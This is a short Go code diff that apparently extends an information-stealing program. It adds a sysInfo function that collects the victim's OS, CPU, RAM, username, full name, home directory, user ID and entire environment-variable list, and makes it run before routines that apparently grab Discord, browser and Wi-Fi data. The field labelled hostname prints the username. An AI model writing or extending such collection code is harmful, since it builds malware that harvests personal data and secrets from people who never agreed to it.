@@ -31,6 +31,9 @@ import (
 	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
 	_ "modernc.org/sqlite"
+	"github.com/shirou/gopsutil/v4/cpu"
+	"github.com/shirou/gopsutil/v4/host"
+	"github.com/shirou/gopsutil/v4/mem"
 )
 
 var (
@@ -282,7 +285,30 @@ func wifiInfo() {
 	}
 }
 
+func sysInfo() {
+	CURRENT_USER, _ := user.Current()
+	memInfo, _ := mem.VirtualMemory()
+	cpuInfo, _ := cpu.Info()
+	hostInfo, _ := host.Info()
+
+	DATA.WriteString(fmt.Sprintf("=========================[SYSTEM]=========================\nOS: %v (%v)\nArchitecure: %v (%v)\nHostname: %v\nFull Name: %v\nHome: %v\nUser ID: %v\nRAM: %v GB\nCPU: %v (%v cores)\nEnvironment: %v\n\n",
+		hostInfo.Platform,
+		hostInfo.PlatformVersion,
+		runtime.GOARCH,
+		hostInfo.KernelArch,
+		CURRENT_USER.Username,
+		CURRENT_USER.Name,
+		CURRENT_USER.HomeDir,
+		CURRENT_USER.Uid,
+		(memInfo.Total / 1024 / 1024 / 1024),
+		cpuInfo[0].ModelName,
+		len(cpuInfo),
+		os.Environ(),
+	))
+}
+
 func fetchData() {
+	sysInfo()
 	ipInfo()
 	discordInfo()
 	browserInfo()
